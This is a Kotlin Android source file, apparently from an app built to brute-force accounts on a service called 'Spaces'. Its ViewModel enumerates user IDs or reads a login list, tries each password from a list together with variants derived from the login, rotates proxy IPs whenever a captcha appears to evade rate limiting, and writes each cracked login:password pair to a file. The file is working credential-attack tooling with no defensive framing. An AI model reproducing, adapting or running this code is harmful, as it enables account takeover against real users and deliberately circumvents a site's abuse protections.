package com.disak.zaebali.ui
import androidx.lifecycle.*
import com.disak.zaebali.R
import com.disak.zaebali.repository.SpacesRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import com.disak.zaebali.models.Result
import com.disak.zaebali.net.*
import com.disak.zaebali.repository.FileRepository
import com.disak.zaebali.repository.ResourceRepository
import kotlinx.coroutines.Job
import java.util.*

class MainViewModel(
    private val resourceRepository: ResourceRepository,
    private var spacesRepository: SpacesRepository,
    private var fileRepository: FileRepository
) : ViewModel() {
    private val _currentUserId = MutableLiveData<Int>()
    val currentUserId: LiveData<Int> = _currentUserId
    private val _errorLiveData = MutableLiveData<String>()
    val errorLiveData: LiveData<String> = _errorLiveData
    private val _log = MutableLiveData<String>()
    val log: LiveData<String> = _log
    val isProgress = MutableLiveData<Boolean>()

    private val _checked = MutableLiveData<Int>().apply {
        value = 0
    }
    val checked: LiveData<Int> = _checked
    private val _success = MutableLiveData<Int>().apply {
        value = 0
    }
    val success: LiveData<Int> = _success

    var passwords = mutableListOf<String>()
    var extraPasswords = mutableListOf<String>()
    private var currentPassword = 0
    var loginList = mutableListOf<String>()
    var login = ""
    var targetName: String? = null
    var target: String? = null
    var job: Job? = null
    var passwordEqualLogin: Boolean = false
    var passwordEqualLoginLower: Boolean = false

    private fun getUserById(userId: Int) {
        _currentUserId.postValue(userId)

        job = CoroutineScope(Dispatchers.IO).launch {
            when(val result = spacesRepository.getUserById(userId)) {
                is Result.Success -> {
                    login = result.data.ownerName?: ""

                    if(login.isEmpty()) {
                        nextUser()
                    } else beginUser()
                }
                is Result.Error -> {
                    _log.postValue(result.exception.message)
                    nextUser()
                }
            }
        }
    }

    private fun nextProxy() {
        job = viewModelScope.launch(Dispatchers.IO) {
            ProxyProcessor.changeIp()
            retryUser()
        }
    }

    private fun addLoginPassword(lower: Boolean) {
        if(login.startsWith("_")) {
            val index = login.indexOf("_", 2)
            val pass= login.substring(index + 1, login.length)

            val lowerPassword = pass.toLowerCase(Locale.getDefault())
            if(lower && extraPasswords.indexOf(lowerPassword) == -1) extraPasswords.add(lowerPassword)
            else if(extraPasswords.indexOf(pass) == -1) extraPasswords.add(pass)
        } else {
            val lowerPassword = login.toLowerCase(Locale.getDefault())
            if(lower && extraPasswords.indexOf(lowerPassword) == -1) extraPasswords.add(lowerPassword)
            else if(extraPasswords.indexOf(login) == -1) extraPasswords.add(login)
        }
    }

    private fun removeLoginPassword() {
        passwords.removeAll(extraPasswords)
        extraPasswords.clear()
    }

    private fun login(login: String, password: String) {
        job = CoroutineScope(Dispatchers.IO).launch {
            when(val result = spacesRepository.login(login, password)) {
                is Result.Success -> {
                    _checked.postValue(_checked.value!! + 1)
                    val passLog = "(${currentPassword + 1}/${passwords.size}) ${result.data.password}"
                    when (result.data.code) {
                        CODE_SUCCESS -> {
                            _log.postValue(resourceRepository.getString(R.string.success, passLog))
                            putResults(result.data.login, result.data.password)
                            _success.postValue(_success.value!! + 1)
                            nextUser()
                        }
                        CODE_WRONG_LOGIN_OR_PASSWORD -> {
                            _log.postValue(resourceRepository.getString(R.string.wrong_password, passLog))
                            nextPassword()
                        }
                        CODE_ERR_WRONG_CAPTCHA_CODE -> {
                            _log.postValue(resourceRepository.getString(R.string.wrong_captcha, passLog))
                            nextProxy()
                        }
                        CODE_ERR_NEED_CAPTCHA -> {
                            _log.postValue(resourceRepository.getString(R.string.need_captcha, passLog))
                            nextProxy()
                        }
                        CODE_ERR_USER_NOT_FOUND -> {
                            _log.postValue(resourceRepository.getString(R.string.user_not_found, passLog))
                            nextUser()
                        }
                        else -> {
                            _log.postValue(resourceRepository.getString(R.string.unknown_error, passLog))
                            nextUser()
                        }
                    }
                }

                is Result.Error -> {
                    _log.postValue(result.exception.message)
                }
            }
        }
    }

    private fun nextPassword() {
        currentPassword++
        currentPassword %= passwords.size

        if (currentPassword == 0) nextUser()
        else login(login, passwords[currentPassword])
    }

    private fun retryUser() {
        if(passwords.isEmpty()) {
            _errorLiveData.postValue(resourceRepository.getString(R.string.need_passwords))
        } else login(login, passwords[currentPassword])
    }

    private fun beginUser() {
        removeLoginPassword()
        if (passwordEqualLogin) {
            addLoginPassword(false)
        }
        if (passwordEqualLoginLower) {
            addLoginPassword(true)
        }
        _log.postValue(resourceRepository.getString(R.string.current_user, this@MainViewModel.login))
        passwords.addAll(extraPasswords)

        if(passwords.isEmpty()) {
            _errorLiveData.postValue(resourceRepository.getString(R.string.need_passwords))
        } else login(login, passwords[currentPassword])
    }

    fun begin(userId: Int) {
        if(target.isNullOrBlank()) {
            _errorLiveData.postValue(resourceRepository.getString(R.string.target_not_set))
        } else {
            isProgress.postValue(true)
            _log.postValue(resourceRepository.getString(R.string.start))
            if(loginList.isEmpty()) getUserById(userId)
            else nextUser()
        }
    }

    private fun putResults(login: String, password: String) {
        target?.let { target ->
            val stream = fileRepository.openOutputStream(target, "wa")
            stream?.use { it.write("$login:$password\n".toByteArray()) }
        }
    }

    fun stop() {
        job?.cancel()
        _log.postValue(resourceRepository.getString(R.string.stopped))
        isProgress.postValue(false)
    }

    private fun nextUser() {
        if(loginList.isEmpty()) {
            val uid = (_currentUserId.value ?: 0) + 1
            getUserById(uid)
        } else {
            login = loginList.first()
            loginList.remove(login)
            beginUser()
        }
    }
}